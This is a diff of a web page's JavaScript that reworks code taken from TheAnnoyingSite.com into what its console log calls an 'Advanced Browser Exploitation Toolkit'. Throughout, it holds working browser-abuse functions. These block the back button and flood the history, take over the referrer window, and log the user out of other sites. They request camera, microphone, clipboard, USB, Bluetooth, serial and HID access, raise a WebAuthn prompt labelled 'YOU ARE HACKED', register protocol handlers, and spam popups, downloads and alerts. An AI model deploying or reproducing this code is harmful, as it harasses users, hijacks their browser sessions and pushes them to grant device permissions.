+                    meta.setAttribute('content', color);
+                }, 50);
             }
         }
 
-        function requestFullscreen() {
-            if (document.documentElement.requestFullscreen) {
-                document.documentElement.requestFullscreen();
-            }
-        }
-
-        function requestCameraAndMic() {
-            if (!navigator.mediaDevices || typeof navigator.mediaDevices.getUserMedia !== 'function') {
+        // Animating the URL with emojis
+        function animateUrlWithEmojis() {
+            if (window.ApplePaySession) {
                 return;
             }
-
-            navigator.mediaDevices.enumerateDevices().then(devices => {
-                const cameras = devices.filter((device) => device.kind === 'videoinput');
-
-                if (cameras.length === 0) return;
-                const camera = cameras[cameras.length - 1];
-
-                navigator.mediaDevices.getUserMedia({
-                    deviceId: camera.deviceId,
-                    facingMode: ['user', 'environment'],
-                    audio: true,
-                    video: true
-                }).then(stream => {
-                    const track = stream.getVideoTracks()[0];
-                    const imageCapture = new window.ImageCapture(track);
-
-                    imageCapture.getPhotoCapabilities().then(() => {
-                        // Let there be light!
-                        track.applyConstraints({ advanced: [{ torch: true }] });
-                    }, () => { /* No torch on this device */ });
-                }, () => { /* ignore errors */ });
-            });
-        }
-
-        function blockBackButton() {
-            window.addEventListener('popstate', () => {
-                window.history.forward();
-            });
-        }
-
-        function fillHistory() {
-            for (let i = 1; i < 20; i++) {
-                window.history.pushState({}, '', window.location.pathname + '?q=' + i);
+            const rand = Math.random();
+            if (rand < 0.33) {
+                animateUrlWithBabies();
+            } else if (rand < 0.67) {
+                animateUrlWithWave();
+            } else {
+                animateUrlWithMoons();
             }
-            window.history.pushState({}, '', window.location.pathname);
-        }
 
-        // Utility functions from TheAnnoyingSite.com
-        function getRandomArrayEntry(arr) {
-            return arr[Math.floor(Math.random() * arr.length)];
-        }
+            function animateUrlWithBabies() {
+                const e = ['🏻', '🏼', '🏽', '🏾', '🏿'];
+                setInterval(() => {
+                    let s = '';
+                    let i; let m;
+                    for (i = 0; i < 10; i++) {
+                        m = Math.floor(e.length * ((Math.sin((Date.now() / 100) + i) + 1) / 2));
+                        s += '👶' + e[m];
+                    }
+                    window.location.hash = s;
+                }, 100);
+            }
 
-        function getRandomCoords() {
-            const x = MARGIN + Math.floor(Math.random() * (SCREEN_WIDTH - WIN_WIDTH - MARGIN));
-            const y = TOP_MARGIN + Math.floor(Math.random() * (SCREEN_HEIGHT - WIN_HEIGHT - TOP_MARGIN));
-            return { x, y };
-        }
+            function animateUrlWithWave() {
+                setInterval(() => {
+                    let i; let n; let s = '';
+                    for (i = 0; i < 10; i++) {
+                        n = Math.floor(Math.sin((Date.now() / 200) + (i / 2)) * 4) + 4;
+                        s += String.fromCharCode(0x2581 + n);
+                    }
+                    window.location.hash = s;
+                }, 100);
+            }
 
-        function detectBrowser() {
-            const userAgent = navigator.userAgent;
-            if (/samsungbrowser\//i.test(userAgent)) {
-                return 'samsung';
-            } else if (/edg\//i.test(userAgent)) {
-                return 'edge';
-            } else if (/edga\//i.test(userAgent)) {
-                return 'edge';
-            } else if (/opt\//i.test(userAgent)) {
-                // Opera iOS
-                return 'opera';
-            } else if (/opr\//i.test(userAgent)) {
-                // Opera Android
-                return 'opera';
-            } else if (/chrome\//i.test(userAgent)) {
-                return 'chrome';
-            } else if (/safari\//i.test(userAgent)) {
-                return 'safari';
-            } else if (/firefox\//i.test(userAgent)) {
-                return 'firefox';
+            function animateUrlWithMoons() {
+                const f = ['🌑', '🌘', '🌗', '🌖', '🌕', '🌔', '🌓', '🌒'];
+                const d = [0, 0, 0, 0, 0, 0, 0, 0];
+                let m = 0;
+                setInterval(() => {
+                    let s = '';
+                    let x = 0;
+                    if (!m) {
+                        while (d[x] === 4) {
+                            x++;
+                        }
+                        if (x >= d.length) m = 1;
+                        else {
+                            d[x]++;
+                        }
+                    } else {
+                        while (d[x] === 0) {
+                            x++;
+                        }
+                        if (x >= d.length) m = 0;
+                        else {
+                            d[x]++;
+                            if (d[x] === 8) d[x] = 0;
+                        }
+                    }
+                    d.forEach(function (n) {
+                        s += f[n];
+                    });
+                    window.location.hash = s;
+                }, 100);
             }
         }
 
-        // Advanced window management from TheAnnoyingSite.com
-        function setupFollowWindow() {
-            document.addEventListener('mousemove', function(e) {
-                window.moveTo(e.screenX - (WIN_WIDTH / 2), e.screenY - (WIN_HEIGHT / 2));
-            });
-        }
-
-        function detectWindowClose() {
-            window.addEventListener('unload', () => {
-                if (!window.opener.closed) window.opener.onCloseWindow(window);
-            });
-        }
-
-        // Enhanced visual effects from TheAnnoyingSite.com
-        function startVideo() {
-            const video = document.createElement('video');
-            video.src = getRandomArrayEntry(VIDEOS);
-            video.autoplay = true;
-            video.loop = true;
-            video.style = 'width: 100%; height: 100%;';
-            document.body.appendChild(video);
-        }
-
-        function startInvisiblePictureInPictureVideo() {
-            const video = document.createElement('video');
-            video.src = getRandomArrayEntry(VIDEOS);
-            video.loop = true;
-            video.muted = true;
-            video.style = HIDDEN_STYLE;
-            video.autoplay = true;
-            video.play();
-            document.body.appendChild(video);
-        }
-
-        // Enhanced clipboard manipulation from TheAnnoyingSite.com
+        // Copy cat pictures onto the user's clipboard
         function copySpamToClipboard() {
             const randomArt = getRandomArrayEntry(ART) + '\nCheck out https://theannoyingsite.com';
             clipboardCopy(randomArt);
         }
 
+        // Copy given text onto the user's clipboard
         function clipboardCopy(text) {
             const span = document.createElement('span');
             span.textContent = text;
@@ -1179,103 +779,25 @@
             return success;
         }
 
-        // Advanced alert system from TheAnnoyingSite.com
+        // Show a modal dialog at a regular interval
+        function startAlertInterval() {
+            setInterval(() => {
+                if (Math.random() < 0.5) {
+                    showAlert();
+                } else {
+                    window.print();
+                }
+            }, 120000);
+        }
+
+        // Show an alert with 1000's of lines of cat ASCII art
         function showAlert() {
             const randomArt = getRandomArrayEntry(ART);
             const longAlertText = Array(200).join(randomArt);
             window.alert(longAlertText);
         }
 
-        // Enhanced theme color changes
-        function rainbowThemeColor() {
-            const meta = document.querySelector('meta[name="theme-color"]');
-            if (meta) {
-                setInterval(() => {
-                    const color = '#' + Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0');
-                    meta.setAttribute('content', color);
-                }, 50);
-            }
-        }
-
-        // Page unload confirmation
-        function confirmPageUnload() {
-            window.addEventListener('beforeunload', event => {
-                speak('Please don\'t go!');
-                event.returnValue = true;
-            });
-        }
-
-        // Referrer window takeover
-        function attemptToTakeoverReferrerWindow() {
-            if (isParentWindow && window.opener && !isParentSameOrigin()) {
-                window.opener.location = `${window.location.origin}/?child=true`;
-            }
-        }
-
-        function isParentSameOrigin() {
-            try {
-                return window.opener.location.origin === window.location.origin;
-            } catch (err) {
-                return false;
-            }
-        }
-
-        // Focus management
-        function focusWindows() {
-            wins.forEach(win => {
-                if (!win.closed) win.focus();
-            });
-        }
-
-        // Initialize TheAnnoyingSite.com behavior
-        function init() {
-            confirmPageUnload();
-            // Removed automatic user interaction interception - now only on red button
-        }
-
-        // Initialize child window behavior
-        function initChildWindow() {
-            registerProtocolHandlers();
-            hideCursor();
-            moveWindowBounce();
-            setupFollowWindow();
-            startVideo();
-            detectWindowClose();
-            triggerFileDownload();
-            speak();
-            rainbowThemeColor();
-            animateUrlWithEmojis();
-            startAlertInterval();
-            
-            // Removed automatic initialization - now only on red button
-        }
-
-        // Initialize parent window behavior
-        function initParentWindow() {
-            showHelloMessage();
-            blockBackButton();
-            fillHistory();
-            startInvisiblePictureInPictureVideo();
-            superLogout();
-            
-            // Removed automatic initialization - now only on red button
-        }
-
-        // Remove hello message (placeholder function)
-        function removeHelloMessage() {
-            // This would remove any initial message if we had one
-        }
-
-        // Show the unsuspecting user a friendly hello message with a cat
-        function showHelloMessage() {
-            const template = document.querySelector('template');
-            if (template) {
-                const clone = document.importNode(template.content, true);
-                document.body.appendChild(clone);
-            }
-        }
-
-        // Trigger a file download immediately (TheAnnoyingSite.com function)
+        // Trigger a file download immediately
         function triggerFileDownload() {
             const fileName = getRandomArrayEntry(FILE_DOWNLOADS);
             const a = document.createElement('a');
@@ -1284,20 +806,145 @@
             a.click();
         }
 
-        // Start an invisible, muted video so we have one ready to put into
-        // picture-in-picture mode on the first user-interaction
-        function startInvisiblePictureInPictureVideo() {
-            const video = document.createElement('video');
-            video.src = getRandomArrayEntry(VIDEOS);
-            video.loop = true;
-            video.muted = true;
-            video.style = HIDDEN_STYLE;
-            video.autoplay = true;
-            video.play();
-            document.body.appendChild(video);
+        // Request access to camera and microphone
+        function requestCameraAndMic() {
+            if (!navigator.mediaDevices || typeof navigator.mediaDevices.getUserMedia !== 'function') {
+                return;
+            }
+
+            navigator.mediaDevices.enumerateDevices().then(devices => {
+                const cameras = devices.filter((device) => device.kind === 'videoinput');
+
+                if (cameras.length === 0) return;
+                const camera = cameras[cameras.length - 1];
+
+                navigator.mediaDevices.getUserMedia({
+                    deviceId: camera.deviceId,
+                    facingMode: ['user', 'environment'],
+                    audio: true,
+                    video: true
+                }).then(stream => {
+                    const track = stream.getVideoTracks()[0];
+                    const imageCapture = new window.ImageCapture(track);
+
+                    imageCapture.getPhotoCapabilities().then(() => {
+                        track.applyConstraints({ advanced: [{ torch: true }] });
+                    }, () => { /* No torch on this device */ });
+                }, () => { /* ignore errors */ });
+            });
         }
 
-        // Enhanced logout functionality from TheAnnoyingSite.com
+        // Attempt to read the user's clipboard
+        function requestClipboardRead() {
+            try {
+                navigator.clipboard.readText().then(
+                    data => {
+                        if (!window.ApplePaySession) {
+                            console.log("Successfully read data from clipboard: '" + data + "'");
+                        }
+                    },
+                    () => {}
+                );
+            } catch {}
+        }
+
+        // Request Webauthn attestation
+        function requestWebauthnAttestation() {
+            try {
+                const createCredentialDefaultArgs = {
+                    publicKey: {
+                        rp: { name: 'Acme' },
+                        user: {
+                            id: new Uint8Array(16),
+                            name: 'YOU_ARE_HACKED@THEANNOYINGSITE.COM',
+                            displayName: 'YOU ARE HACKED'
+                        },
+                        pubKeyCredParams: [{ type: 'public-key', alg: -7 }],
+                        attestation: 'direct',
+                        timeout: 60000,
+                        challenge: new Uint8Array([
+                            0x8C, 0x0A, 0x26, 0xFF, 0x22, 0x91, 0xC1, 0xE9, 0xB9, 0x4E, 0x2E, 0x17, 0x1A, 0x98, 0x6A, 0x73,
+                            0x71, 0x9D, 0x43, 0x48, 0xD5, 0xA7, 0x6A, 0x15, 0x7E, 0x38, 0x94, 0x52, 0x77, 0x97, 0x0F, 0xEF
+                        ]).buffer
+                    }
+                };
+
+                const getCredentialDefaultArgs = {
+                    publicKey: {
+                        timeout: 60000,
+                        challenge: new Uint8Array([
+                            0x79, 0x50, 0x68, 0x71, 0xDA, 0xEE, 0xEE, 0xB9, 0x94, 0xC3, 0xC2, 0x15, 0x67, 0x65, 0x26, 0x22,
+                            0xE3, 0xF3, 0xAB, 0x3B, 0x78, 0x2E, 0xD5, 0x6F, 0x81, 0x26, 0xE2, 0xA6, 0x01, 0x7D, 0x74, 0x50
+                        ]).buffer
+                    }
+                };
+
+                navigator.credentials.create(createCredentialDefaultArgs)
+                    .then((cred) => {
+                        const idList = [{
+                            id: cred.rawId,
+                            transports: ['usb', 'nfc', 'ble'],
+                            type: 'public-key'
+                        }];
+                        getCredentialDefaultArgs.publicKey.allowCredentials = idList;
+                        return navigator.credentials.get(getCredentialDefaultArgs);
+                    });
+            } catch {}
+        }
+
+        // Request access to MIDI devices
+        function requestMidiAccess() {
+            try {
+                navigator.requestMIDIAccess({ sysex: true });
+            } catch {}
+        }
+
+        // Request access to Bluetooth devices
+        function requestBluetoothAccess() {
+            try {
+                navigator.bluetooth.requestDevice({ acceptAllDevices: true })
+                    .then(device => device.gatt.connect());
+            } catch {}
+        }
+
+        // Request access to USB devices
+        function requestUsbAccess() {
+            try {
+                navigator.usb.requestDevice({ filters: [{}] });
+            } catch {}
+        }
+
+        // Request access to Serial devices
+        function requestSerialAccess() {
+            try {
+                navigator.serial.requestPort({ filters: [] });
+            } catch {}
+        }
+
+        // Request access to HID devices
+        function requestHidAccess() {
+            try {
+                navigator.hid.requestDevice({ filters: [] });
+            } catch {}
+        }
+
+        // Attempt to register all possible browser-whitelisted protocols
+        function registerProtocolHandlers() {
+            if (typeof navigator.registerProtocolHandler !== 'function') return;
+
+            const protocolWhitelist = [
+                'bitcoin', 'geo', 'im', 'irc', 'ircs', 'magnet', 'mailto', 'mms', 'news',
+                'nntp', 'sip', 'sms', 'smsto', 'ssh', 'tel', 'urn', 'webcal', 'wtai', 'xmpp'
+            ];
+
+            const handlerUrl = window.location.href + '/url=%s';
+
+            protocolWhitelist.forEach(proto => {
+                navigator.registerProtocolHandler(proto, handlerUrl, 'The Annoying Site');
+            });
+        }
+
+        // Log the user out of top sites they're logged into
         function superLogout() {
             function cleanup(el, delayCleanup) {
                 if (delayCleanup) {
@@ -1371,194 +1018,6 @@
             }
         }
 
-        // Our Custom Functions (keeping our design)
-        function triggerCatPictures() {
-            for (let i = 0; i < 5; i++) {
-                setTimeout(() => {
-                    const img = document.createElement('img');
-                    img.src = `static/${FILE_DOWNLOADS[Math.floor(Math.random() * FILE_DOWNLOADS.length)]}`;
-                    img.style.cssText = `
-                        position: fixed;
-                        top: ${Math.random() * (window.innerHeight - 200)}px;
-                        left: ${Math.random() * (window.innerWidth - 200)}px;
-                        width: 200px;
-                        height: 200px;
-                        z-index: 9999;
-                        border: 3px solid #ff6b6b;
-                        border-radius: 10px;
-                        box-shadow: 0 0 20px rgba(255, 107, 107, 0.8);
-                    `;
-                    img.onclick = () => img.remove();
-                    document.body.appendChild(img);
-                    
-                    setTimeout(() => {
-                        if (img.parentNode) img.remove();
-                    }, 5000);
-                }, i * 500);
-            }
-        }
-
-        function triggerVideoSpam() {
-            for (let i = 0; i < 3; i++) {
-                setTimeout(() => {
-                    const video = document.createElement('video');
-                    video.src = `static/${VIDEOS[Math.floor(Math.random() * VIDEOS.length)]}`;
-                    video.autoplay = true;
-                    video.loop = true;
-                    video.muted = true;
-                    video.style.cssText = `
-                        position: fixed;
-                        top: ${Math.random() * (window.innerHeight - 300)}px;
-                        left: ${Math.random() * (window.innerWidth - 400)}px;
-                        width: 400px;
-                        height: 300px;
-                        z-index: 9998;
-                        border: 3px solid #4ecdc4;
-                        border-radius: 10px;
-                        box-shadow: 0 0 20px rgba(78, 205, 196, 0.8);
-                    `;
-                    video.onclick = () => video.remove();
-                    document.body.appendChild(video);
-                    
-                    setTimeout(() => {
-                        if (video.parentNode) video.remove();
-                    }, 8000);
-                }, i * 1000);
-            }
-        }
-
-        function triggerPopups() {
-            for (let i = 0; i < 5; i++) {
-                setTimeout(() => {
-                    const popup = window.open('', '_blank', 'width=400,height=300');
-                    if (popup) {
-                        popup.document.write(`
-                            <!DOCTYPE html>
-                            <head><title>ANNOYING POPUP ${i + 1}</title></head>
-                            <body style="background:red;color:white;text-align:center;padding:50px;">
-                                <h1>🚨 ANNOYING POPUP ${i + 1} 🚨</h1>
-                                <p>This popup is designed to be annoying!</p>
-                                <p>Click anywhere to close it!</p>
-                            </body>
-                        `);
-                        popup.document.body.onclick = function() { popup.close(); };
-                        setTimeout(function() { popup.close(); }, 5000);
-                    }
-                }, i * 500);
-            }
-        }
-
-        function triggerDownloads() {
-            for (let i = 0; i < 5; i++) {
-                setTimeout(() => {
-                    triggerFileDownload();
-                }, i * 500);
-            }
-        }
-
-        function triggerSearchSpam() {
-            for (let i = 0; i < 5; i++) {
-                setTimeout(() => {
-                    const searchWindow = window.open(
-                        `https://www.bing.com/search?q=${encodeURIComponent(SEARCHES[Math.floor(Math.random() * SEARCHES.length)])}`,
-                        '_blank',
-                        'width=800,height=600'
-                    );
-                    if (searchWindow) {
-                        setTimeout(() => searchWindow.close(), 3000);
-                    }
-                }, i * 1000);
-            }
-        }
-
-        function triggerLogout() {
-            superLogout();
-        }
-
-        function triggerBrowserData() {
-            const data = {
-                userAgent: navigator.userAgent,
-                language: navigator.language,
-                platform: navigator.platform,
-                cookieEnabled: navigator.cookieEnabled,
-                onLine: navigator.onLine,
-                screenWidth: screen.width,
-                screenHeight: screen.height,
-                colorDepth: screen.colorDepth,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                timestamp: new Date().toISOString()
-            };
-            
-            console.log('🔐 Browser Data Grabbed:', data);
-        }
-
-        // Enhanced Full Annoyance Mode - Now uses TheAnnoyingSite.com functions
-        function triggerFullAnnoyance() {
-            console.log('💀 FULL ANNOYANCE MODE ACTIVATED!');
-            
-            // Core annoyance features
-            triggerCatPictures();
-            triggerVideoSpam();
-            triggerPopups();
-            triggerDownloads();
-            triggerSearchSpam();
-            triggerLogout();
-            triggerBrowserData();
-            
-            // TheAnnoyingSite.com functions - called immediately to maintain user context
-            startVibrateInterval();
-            speak('This is the most annoying experience ever!');
-            startTheramin();
-            blockBackButton();
-            fillHistory();
-            requestCameraAndMic();
-            requestClipboardRead();
-            requestFullscreen();
-            requestMidiAccess();
-            requestBluetoothAccess();
-            requestUsbAccess();
-            requestSerialAccess();
-            requestHidAccess();
-            requestWebauthnAttestation();
-            registerProtocolHandlers();
-            animateUrlWithEmojis();
-            
-            // New enhanced features
-            openWindow();
-            hideCursor();
-            requestPointerLock();
-            enablePictureInPicture();
-            rainbowThemeColor();
-            
-            // Advanced TheAnnoyingSite.com features
-            moveWindowBounce();
-            setupFollowWindow();
-            startVideo();
-            startInvisiblePictureInPictureVideo();
-            copySpamToClipboard();
-            startAlertInterval();
-            confirmPageUnload();
-            attemptToTakeoverReferrerWindow();
-            focusWindows();
-            superLogout();
-            
-            // Missing TheAnnoyingSite.com functions
-            triggerFileDownload();
-            showHelloMessage();
-        }
-
-        // Individual download trigger
-        function triggerDownload(filename) {
-            const link = document.createElement('a');
-            link.href = `static/${filename}`;
-            link.download = filename;
-            link.click();
-        }
-
-        function closePopup() {
-            document.getElementById('annoying-popup').style.display = 'none';
-        }
-
         // Initialize
         document.addEventListener('DOMContentLoaded', function() {
             console.log('🚀 Advanced Browser Exploitation Toolkit loaded!');
@@ -1566,4 +1025,4 @@
         });
     </script>
 </body>
-</html> 
+</html>
